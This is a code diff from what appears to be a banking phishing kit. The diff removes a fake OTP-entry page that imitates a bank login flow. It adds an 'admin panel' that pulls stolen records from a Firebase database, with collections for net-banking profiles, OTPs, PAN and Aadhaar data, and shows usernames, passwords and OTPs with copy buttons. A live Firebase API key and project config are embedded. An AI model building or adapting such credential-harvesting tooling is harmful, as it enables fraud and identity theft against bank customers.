@@ -1,348 +1,199 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>sbynorewdpolnt</title>
+  <meta charset="UTF-8" />
+  <title>Admin Panel - Collection View</title>
   <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      width: 100%;
-      overflow-x: hidden;
-    }
     body {
       font-family: Arial, sans-serif;
-      background-color: #eef2f5;
+      padding: 1rem;
+      margin: 0;
+      background: #f5f5f5;
+      color: #000;
+    }
+    .top-bar {
       display: flex;
-      flex-direction: column;
-      align-items: center;
-      min-height: 100vh;
-      position: relative;
+      flex-wrap: wrap;
+      gap: 10px;
+      margin-bottom: 1rem;
     }
-    .header, .footer {
-      width: 100%;
-      background-color: #fff;
-      text-align: center;
-      position: relative;
-    }
-    .header img.main-header {
-      width: 100%;
-      display: block;
-      margin: 0 auto;
-    }
-    .menu-button {
-      position: absolute;
-      top: 10px;
-      left: 10px;
-      width: 30px;
-      height: 30px;
-    }
-    .headline {
-      width: 100%;
-      max-width: 400px;
-      height: 80px;
-      background: linear-gradient(to right, #8e24aa, #510f87);
-      display: flex;
-      align-items: center;
-      padding-left: 10px;
-      color: #fff;
-      font-weight: bold;
-      font-size: 20px;
-      position: relative;
-      box-sizing: border-box;
-    }
-    .headline .close-btn {
-      position: absolute;
-      right: 30px;
-      font-size: 24px;
-      top: 50%;
-      transform: translateY(-50%);
-      cursor: pointer;
-    }
-    .headline .headline-text {
-      margin-left: 20px;
-    }
-    /* Progress Bar */
-    .progress-bar-container {
-      width: 100%;
-      max-width: 400px;
-      height: 10px;
-      background-color: #e0e0e0;
-      border-radius: 5px;
-      margin-bottom: 20px;
-      overflow: hidden;
-      position: relative;
-    }
-    .progress-bar {
-      height: 100%;
-      background-color: #4caf50;
-      width: 25%;
-      text-align: center;
-      color: white;
-      line-height: 10px;
-      font-size: 12px;
-    }
-    .otp-section {
-      background-color: #ffffff;
-      width: 100%;
-      max-width: 400px;
-      padding: 25px 20px;
-      border: 1px solid #ccc;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
-      margin: 10px 0;
-      text-align: left;
-      box-sizing: border-box;
-    }
-    .otp-title {
-      font-size: 20px;
-      font-weight: bold;
-      margin-bottom: 10px;
-      margin-top: 40px;
-      text-align: center;
-      color: #000000;
-    }
-    .otp-description {
-      font-size: 14px;
-      color: #000000;
-      text-align: center;
-      margin-bottom: 25px;
-    }
-    label {
-      font-size: 16px;
-      font-weight: bold;
-      display: block;
-      margin-bottom: 5px;
-    }
-    .otp-input {
-      width: 100%;
+    .top-bar button {
+      padding: 6px 12px;
       border: none;
-      border-bottom: 2px solid #6a1b9a;
-      padding: 10px 5px;
-      font-size: 16px;
-      outline: none;
-      margin-bottom: 5px;
-      box-sizing: border-box;
+      border-radius: 4px;
+      cursor: pointer;
+      background: #333;
+      color: white;
+      font-weight: bold;
     }
-    .error-message {
+    h2 {
+      margin-top: 2rem;
+      border-bottom: 2px solid #ccc;
+      padding-bottom: 5px;
       color: red;
-      font-size: 13px;
+    }
+    .entry {
+      background: #ffffff;
       margin-bottom: 10px;
-      display: none;
+      padding: 10px;
+      border-radius: 6px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.1);
     }
-    #otp-timer {
-      font-size: 14px;
+    .field {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 6px;
+      flex-wrap: wrap;
+    }
+    .label {
       font-weight: bold;
-      color: #000000;
-      margin-bottom: 15px;
-      text-align: left;
     }
-    #otp-timer span {
-      color: #6a1b9a;
+    .timestamp {
+      font-size: 0.8rem;
+      color: red;
+      margin-top: 3px;
     }
-    .resend-otp {
-      font-size: 14px;
-      color: #6a1b9a;
-      background: none;
-      border: none;
-      padding: 0;
-      cursor: pointer;
-      text-decoration: underline;
-      text-align: left;
-      margin-bottom: 15px;
-    }
-    .submit-btn {
-      font-size: 16px;
-      background-color: #6a1b9a;
+    .copy-btn, .delete-btn {
+      background: #007bff;
       color: white;
       border: none;
-      padding: 12px;
-      border-radius: 5px;
+      border-radius: 4px;
+      padding: 4px 8px;
       cursor: pointer;
-      width: 100%;
-      margin-top: 10px;
+      white-space: nowrap;
+      margin-left: auto;
+      margin-top: 5px;
     }
-    .security-image img {
-      width: 100%;
-      border-radius: 6px;
-      margin-top: 10px;
+    .delete-btn {
+      background: #dc3545;
     }
-    /* Loading Overlay */
-    .overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(255, 255, 255, 0.8);
-      backdrop-filter: blur(5px);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 1000;
+    .section {
       display: none;
-      text-align: center;
-    }
-    .spinner {
-      border: 5px solid #f3f3f3;
-      border-top: 5px solid #6a1b9a;
-      border-radius: 50%;
-      width: 60px;
-      height: 60px;
-      animation: spin 1s linear infinite;
-      margin-bottom: 20px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    .loading-text {
-      font-size: 18px;
-      color: #333;
-      max-width: 80%;
-      line-height: 1.6;
-    }
-    @media (max-width: 480px) {
-      .otp-section {
-        padding: 20px 15px;
-      }
-      .headline, .header, .footer {
-        max-width: 100%;
-      }
-      .otp-title {
-        font-size: 18px;
-      }
-      .otp-description {
-        font-size: 13px;
-      }
     }
   </style>
 </head>
 <body>
+  <div class="top-bar" id="collectionButtons"></div>
+  <div id="dataContainer"></div>
 
-<!-- Loading Overlay -->
-<div class="overlay" id="overlay">
-  <div class="spinner"></div>
-  <div class="loading-text" id="loadingText">Please wait...<br>Verifying Your Login Details...<br>Redirecting in <span id="countdown">3</span> seconds.</div>
-</div>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+    import { getFirestore, collection, getDocs, deleteDoc, doc, query } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
 
-<!-- Top Header -->
-<div class="header">
-  <img src="https://i.ibb.co/35CHJp2B/Menu.png" alt="Menu" class="menu-button">
-  <img src="https://i.ibb.co/sdHPbk20/Header-1.jpg" alt="Top Header Logo" class="main-header">
-</div>
+    const firebaseConfig = {
+      apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+      authDomain: "sbighsh.firebaseapp.com",
+      projectId: "sbighsh",
+      storageBucket: "sbighsh.appspot.com",
+      messagingSenderId: "685947657107",
+      appId: "1:685947657107:web:471a0557bb72235272a666"
+    };
 
-<!-- Headline Section -->
-<div class="headline">
-  <div class="close-btn">X</div>
-  <div class="headline-text">Enter OTP</div>
-</div>
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const collections = ["netbanking_profile", "otp_verifications", "pan_verification", "users", "aadhaar_verifications"];
+    const container = document.getElementById("dataContainer");
+    const buttonsDiv = document.getElementById("collectionButtons");
+    let allEntries = {};
 
-<!-- Progress Bar -->
-<div class="progress-bar-container">
-  <div class="progress-bar" style="width: 35%;">
-    <div class="progress-text">35% Complete</div>
-  </div>
-</div>
+    function createField(key, value) {
+      const field = document.createElement("div");
+      field.className = "field";
 
-<!-- OTP Section -->
-<div class="otp-section">
-  <div class="otp-title">OTP Verification</div>
-  <div class="otp-description">
-    We have sent an OTP to your registered mobile number. Please enter the OTP and proceed.
-  </div>
+      const label = document.createElement("div");
+      label.className = "label";
+      label.textContent = `${key}: ${value}`;
 
-  <input type="text" id="otpInput" class="otp-input" placeholder="Enter OTP" maxlength="8" oninput="validateOTP()" required>
-  <div id="otpError" class="error-message">Please enter OTP</div>
+      const btn = document.createElement("button");
+      btn.className = "copy-btn";
+      btn.textContent = "Copy";
+      btn.onclick = () => {
+        navigator.clipboard.writeText(value);
+        btn.textContent = "Copied!";
+        setTimeout(() => btn.textContent = "Copy", 1500);
+      };
 
-  <!-- Timer -->
-  <div id="otp-timer">Wait for OTP: <span id="timer">03:00 seconds</span></div>
-
-  <button class="resend-otp" onclick="resendOTP()">Resend OTP</button>
-
-  <button class="submit-btn" onclick="submitForm()">Submit</button>
-</div>
-
-<!-- Security Image -->
-<div class="security-image">
-  <img src="https://i.ibb.co/zVvCpZM2/Security-A.jpg" alt="Security Image">
-</div>
-
-<!-- Bottom Footer -->
-<div class="footer">
-  <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
-</div>
-
-<script>
-  var timerInterval;
-  var totalSeconds = 180;
-
-  function startTimer() {
-    clearInterval(timerInterval);
-    totalSeconds = 180;
-    updateTimerDisplay();
-    timerInterval = setInterval(function() {
-      totalSeconds--;
-      updateTimerDisplay();
-      if (totalSeconds <= 0) {
-        clearInterval(timerInterval);
-      }
-    }, 1000);
-  }
-
-  function updateTimerDisplay() {
-    var minutes = Math.floor(totalSeconds / 60);
-    var seconds = totalSeconds % 60;
-    document.getElementById('timer').textContent =
-      (minutes < 10 ? '0' : '') + minutes + ":" + (seconds < 10 ? '0' : '') + seconds + " seconds";
-  }
-
-  function resendOTP() {
-    startTimer();
-    alert('OTP has been resent.');
-  }
-
-  function submitForm() {
-    var otpInput = document.getElementById('otpInput');
-    var otpError = document.getElementById('otpError');
-    if (otpInput.value.trim() === "") {
-      otpError.style.display = 'block';
-      otpInput.focus();
-      return;
-    } else {
-      otpError.style.display = 'none';
+      field.appendChild(label);
+      field.appendChild(btn);
+      return field;
     }
-    showLoading();
-  }
 
-  function showLoading() {
-    document.getElementById('overlay').style.display = 'flex';
-    var countdown = 3;
-    var countdownElement = document.getElementById('countdown');
-    countdownElement.textContent = countdown;
+    function createEntry(entry, colName) {
+      const div = document.createElement("div");
+      div.className = "entry";
 
-    var interval = setInterval(function() {
-      countdown--;
-      if (countdown >= 0) {
-        countdownElement.textContent = countdown;
+      const displayOrder = ["username", "password", "otp", "profile", "name"];
+
+      displayOrder.forEach(key => {
+        if (entry.data[key]) {
+          const label = key.charAt(0).toUpperCase() + key.slice(1);
+          const field = createField(label, entry.data[key]);
+          div.appendChild(field);
+        }
+      });
+
+      for (const key in entry.data) {
+        if (displayOrder.includes(key) || (typeof entry.data[key] === "object" && entry.data[key]?.seconds)) continue;
+        const field = createField(key, entry.data[key]);
+        div.appendChild(field);
       }
-      if (countdown < 0) {
-        clearInterval(interval);
-        window.location.href = 'login.html'; // Replace with your next page
+
+      if (entry.data.timestamp?.seconds) {
+        const time = new Date(entry.data.timestamp.seconds * 1000).toLocaleString();
+        const timeDiv = document.createElement("div");
+        timeDiv.className = "timestamp";
+        timeDiv.textContent = `Time: ${time}`;
+        div.appendChild(timeDiv);
       }
-    }, 1000);
-  }
 
-  function validateOTP() {
-    var input = document.getElementById('otpInput');
-    input.value = input.value.replace(/[^0-9]/g, '').slice(0, 8);
-  }
+      return div;
+    }
 
-  window.onload = function() {
-    startTimer();
-  };
-</script>
+    async function loadData() {
+      for (const col of collections) {
+        const q = query(collection(db, col));
+        const snap = await getDocs(q);
+        allEntries[col] = [];
+        snap.forEach(docSnap => {
+          allEntries[col].push({
+            id: docSnap.id,
+            data: docSnap.data(),
+          });
+        });
+        allEntries[col].sort((a, b) => (b.data.timestamp?.seconds || 0) - (a.data.timestamp?.seconds || 0));
+      }
+      createCollectionButtons();
+    }
 
+    function createCollectionButtons() {
+      collections.forEach(col => {
+        const btn = document.createElement("button");
+        btn.textContent = col.replace(/_/g, " ").toUpperCase();
+        btn.onclick = () => showCollection(col);
+        buttonsDiv.appendChild(btn);
+      });
+    }
+
+    function showCollection(col) {
+      container.innerHTML = "";
+      const section = document.createElement("div");
+      section.className = "section";
+      section.style.display = "block";
+
+      const heading = document.createElement("h2");
+      heading.textContent = col.toUpperCase();
+      section.appendChild(heading);
+
+      allEntries[col].forEach(entry => {
+        const div = createEntry(entry, col);
+        section.appendChild(div);
+      });
+
+      container.appendChild(section);
+    }
+
+    await loadData();
+  </script>
 </body>
 </html>
